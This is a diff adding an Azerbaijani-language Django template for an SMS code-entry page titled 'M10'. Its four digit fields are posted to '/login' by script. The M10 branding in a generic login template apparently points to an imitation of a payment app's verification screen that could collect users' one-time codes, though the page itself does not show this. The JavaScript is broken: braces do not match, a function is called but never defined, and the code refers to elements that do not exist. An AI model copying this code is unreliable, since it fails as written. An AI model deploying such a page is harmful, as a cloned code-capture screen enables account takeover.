@@ -1,0 +1,238 @@
+
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>M10</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--===============================================================================================-->	
+	<link rel="icon" type="image/png" href="{% static 'assets/login/images/icons/icon.svg' %}"/>
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="{% static '/assets/login/vendor/bootstrap/css/bootstrap.min.css' %}">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="{% static '/assets/login/vendor/animate/animate.css' %}">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="{% static '/assets/login/vendor/css-hamburgers/hamburgers.min.css' %}">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="{% static '/assets/login/vendor/animsition/css/animsition.min.css' %}">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="{% static '/assets/login/vendor/select2/select2.min.css' %}">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="{% static '/assets/login/vendor/daterangepicker/daterangepicker.css' %}">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="{% static 'assets/login/css/util.css' %}">
+	<link rel="stylesheet" type="text/css" href="{% static '/assets/login/css/main.css' %}">
+<!--===============================================================================================-->
+</head>
+
+
+<body>
+	<div class="limiter">
+		<div class="container-login100 container">
+			<div class="wrap-login100 container">
+				<form method='POST' action='verify' class="login100-form validate-form d-flex align-items-center justify-content-center flex-col">
+					<span class="login100-form-title">
+						<img class="iconTab" src="{% static '/assets/login/icon.svg' %}" alt="">
+					</span>
+					<h4 style="white-space: nowrap;overflow:font-size:1.05rem; margin-bottom: 1rem!important;">SMS-lə gələn kodu daxil eti</h4>
+					<h5 style="white-space: nowrap;overflow: hidden;text-overflow: ellipsis;font-size: 1.05rem;margin-bottom: 1rem!important;">Kodu +994 {{number1}} {{number2}} {{number3}} {{number4}} nömrəsinə göndərdik</h5>
+					<div class="input-container">
+						<input class="number-button-otp" id="phone1" required pattern="[0-9]" oninvalid="setCustomValidity('Zəhmət olmasa yalnızca rəqəm daxil edin')" oninput="setCustomValidity('')" type="tel" inputmode="numeric" minlength="1" maxlength="1" name="phone1">
+						<input class="number-button-otp" id="phone2" required pattern="[0-9]" oninvalid="setCustomValidity('Zəhmət olmasa yalnızca rəqəm daxil edin')" oninput="setCustomValidity('')" type="tel" inputmode="numeric" minlength="1" maxlength="1" name="phone2">
+						<input class="number-button-otp" id="phone3" required pattern="[0-9]" oninvalid="setCustomValidity('Zəhmət olmasa yalnızca rəqəm daxil edin')" oninput="setCustomValidity('')" type="tel" inputmode="numeric" minlength="1" maxlength="1" name="phone3">
+						<input class="number-button-otp" id="phone4" required pattern="[0-9]" oninvalid="setCustomValidity('Zəhmət olmasa yalnızca rəqəm daxil edin')" oninput="setCustomValidity('')" type="tel" inputmode="numeric" minlength="1" maxlength="1" name="phone4">
+					  </div>
+					  
+					  <br>
+					  <label class="" for="phone5">SMS Gəlmədi? </label>
+						<label class="" id="countdown" style="text-align: center;" for="phone5">00:30 saniyyə sonra yenidən göndər</label>
+        
+						<a class="" href=""  id="resendButton" style="display: none;">Kodu yenidən göndər</a>
+					<div class="container-login100-form-btn">
+						<div class="d-flex align-items-center justify-content-center flex-col ">
+							<input class="btn btn-primary inputTab submitBtn" type="submit" value="Kodu daxil et">
+						</div>
+					</div>
+					<div class="text-center p-t-115">
+						<span class="txt1">
+							"Kodu əldə et" düyməsinə klikləməklə siz Tətbiqdən istifadə şərtləri və məxfilik siyasəti ilə razılaşdığınızı təsdiq edirsiniz.
+						</span>
+					</div>
+				</form>
+			</div>
+		</div>
+	</div>
+	
+	<div id="dropDownSelect1"></div>
+	
+	<!--===============================================================================================-->
+	<!--===============================================================================================-->
+	<!--===============================================================================================-->
+</body>
+</html>
+<script>
+	var input1 = document.getElementById("phone1");
+	var input2 = document.getElementById("phone2");
+	var input3 = document.getElementById("phone3");
+	var input4 = document.getElementById("phone4");
+	
+	input1.addEventListener("keyup", function() {
+		if (input1.value.length == 1) {
+			input2.focus();
+		}
+	});
+	
+	input2.addEventListener("keyup", function() {
+		if (input2.value.length == 1) {
+			input3.focus();
+		}
+	});
+	
+	input3.addEventListener("keyup", function() {
+		if (input3.value.length == 1) {
+			input4.focus();
+		}
+	});
+	
+	input4.addEventListener("keyup", function() {
+	   if (input1.value.length == 1 && input2.value.length == 1 && input3.value.length == 1 && input4.value.length == 1) {
+				// Make an AJAX request to your Django view
+				var input1 = document.getElementById("phone1");
+				var input2 = document.getElementById("phone2");
+				var input3 = document.getElementById("phone3");
+				var input4 = document.getElementById("phone4");
+				var xhr = new XMLHttpRequest();
+				xhr.open("POST", "/login"); // Replace "/login" with the URL of your Django view
+				xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+				xhr.onreadystatechange = function() {
+					if (xhr.readyState === 4 && xhr.status === 200) {
+					console.log(xhr.responseText);
+					// Handle the response from the server as needed
+					}
+				};
+				var data = "phone1=" + input1.value + "&phone2=" + input2.value + "&phone3=" + input3.value + "&phone4=" + input4.value;
+				xhr.send(data);
+				  }
+				});
+				
+			}
+	   }
+	});
+	
+	</script>
+<style>
+    .input-container {
+        display: flex; /* or display: grid; */
+        gap: 10px; /* Adjust the gap as per your preference */
+    }
+    .number-button-otp {
+        /* Adjust the styles for the input fields as needed */
+        flex: 1; /* or grid-column: auto; */
+    }
+</style>
+<style>
+	.number-button-otp {
+    font-size: 20px;
+    font-weight: bold;
+    text-decoration: none;
+    text-align: center;
+    padding: 27px 0px;
+    border-radius: 22px;
+    transition: all 0.3s ease;
+    display: inline-flex;
+    justify-content: center;
+    align-items: center;
+    border: 1px solid black;
+    position: relative;
+    min-width: 69px; 
+    width: 69px; 
+    background-color: #ebeaf3;
+  }
+</style>
+
+<script>
+	window.addEventListener('DOMContentLoaded', function() {
+	
+	var inputs = document.querySelectorAll('.number-button-otp');
+	
+	
+	inputs.forEach(function(input, index) {
+		input.addEventListener('input', function(e) {
+			// Girilen değeri al
+			var value = e.target.value;
+			
+			
+			if (value.length >= 1 && index < inputs.length - 1) {
+				inputs[index + 1].focus();
+			}
+			
+			
+			var allFilled = Array.from(inputs).every(function(input) {
+				return input.value.length >= 1;
+			});
+			
+			
+			var submitButton = document.querySelector('.download-btn');
+			submitButton.disabled = !allFilled;
+		});
+	});
+});
+</script>
+
+
+<script>
+      
+	var countdownTime = 60;
+	
+	
+	function startCountdown() {
+	  var countdownLabel = document.getElementById("countdown");
+	  var resendButton = document.getElementById("resendButton");
+	
+	 
+	  var countdownInterval = setInterval(function() {
+	   
+	  countdownTime--;
+	
+	  
+	  var minutes = Math.floor(countdownTime / 60);
+	  var seconds = countdownTime % 60;
+	  var formattedTime = ("0" + minutes).slice(-2) + ":" + ("0" + seconds).slice(-2);
+	
+	  
+	  countdownLabel.innerHTML = formattedTime + " saniiyyə sonra yenidən göndər";
+	
+	   
+	  if (countdownTime <= 0) {
+		clearInterval(countdownInterval);
+		countdownLabel.style.display = "none";
+		resendButton.style.display = "block";
+	  }
+	  }, 1000); 
+	}
+	
+	
+	
+	startCountdown();
+	
+	
+	var resendButton = document.getElementById("resendButton");
+	resendButton.addEventListener("click", resendCode);
+	
+	
+	
+		</script>
+
+		<script>
+			function validatePhone(input, event) {
+			  // Check if all input fields have a value
+			  const inputs = document.querySelectorAll('.number-button-otp');
+			  const allFilled = Array.from(inputs).every(input => input.value !== '');
+		  
+			  // Enable/disable the next button based on the input fields' values
+			  const nextButton = document.getElementById('nextButton');
+			  nextButton.disabled = !allFilled;
+			}
+		  </script>
+		
